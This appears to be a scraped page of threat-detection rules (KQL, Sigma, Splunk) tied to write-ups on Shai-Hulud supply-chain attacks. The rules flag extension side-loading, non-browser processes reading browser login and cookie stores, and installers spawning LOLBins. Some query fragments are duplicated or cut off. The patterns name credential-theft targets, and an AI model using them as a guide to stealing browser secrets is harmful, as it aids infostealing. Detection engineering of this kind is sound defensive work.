  - https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem
  - https://www.ox.security/blog/lightning-python-package-shai-hulud-supply-chain-attack/

| `drop_dm_object_name(Filesystem)`
| convert ctime(firstTime) ctime(lastTime)

| convert ctime(firstTime) ctime(lastTime)
Suspicious browser extension installation Installation Medium
Side-loaded / unsigned extensions, often masquerading as wallets, productivity tools.
ATT&CKT1176
Data sourcesEndpoint.Registry DeviceRegistryEvents
DeviceRegistryEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where RegistryKey has_any ("\Software\Google\Chrome\Extensions\","\Software\Microsoft\Edge\Extensions\","\Software\Mozilla\Firefox\Extensions\")

          InitiatingProcessFileName, InitiatingProcessAccountName

                              @"\Software\Microsoft\Edge\Extensions\",
                              @"\Software\Mozilla\Firefox\Extensions\")
| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey,
          RegistryValue, RegistryValueData, ActingProcessName
| order by TimeGenerated desc

Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Google\Chrome\User Data\", @"\Microsoft\Edge\User Data\", @"\Mozilla\Firefox\Profiles\")
| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetFilePath has_any (@"\Google\Chrome\User Data\",
                                  @"\Microsoft\Edge\User Data\",
                                  @"\Mozilla\Firefox\Profiles\")
| where TargetFileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where ActingProcessName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          TargetFilePath, TargetFileName, EventType

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
